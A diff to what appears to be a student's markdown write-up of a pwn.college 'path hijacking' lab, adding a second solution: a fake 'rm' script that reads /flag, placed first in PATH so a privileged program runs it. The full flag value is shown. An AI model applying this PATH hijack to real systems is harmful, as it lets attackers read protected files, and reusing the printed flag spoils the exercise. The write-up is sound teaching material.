@@ -174,9 +174,29 @@ Found 'rm' command at /home/hacker/rm. Executing!
 pwn.college{sXYdfwJFlg4p0fH86Le102Qgvu2.QX3cjM1wiM4kjNzEzW}
 hacker@path~hijacking-commands:~$
 ```
+or
+```
+hacker@path~hijacking-commands:~$ cat > rm << 's'
+> #!/bin/bash
+> cat /flag
+> s
+hacker@path~hijacking-commands:~$ which cat
+/run/dojo/bin/cat
+hacker@path~hijacking-commands:~$ PATH=""
+hacker@path~hijacking-commands:~$ PATH=/home/hacker:/run/dojo/bin:$PATH
+hacker@path~hijacking-commands:~$ echo $PATH
+/home/hacker:/run/dojo/bin:
+hacker@path~hijacking-commands:~$ /challenge/run
+Trying to remove /flag...
+Found 'rm' command at /home/hacker/rm. Executing!
+pwn.college{sXYdfwJFlg4p0fH86Le102Qgvu2.QX3cjM1wiM4kjNzEzW}
+```
+
+
 
 ## What I learned
-To hijack commands in linux terminal.
+* To hijack commands in linux terminal.
+* I also learnt about the *nano* command and how to use it to create a shell script. 
 
 ## References 
 No references.
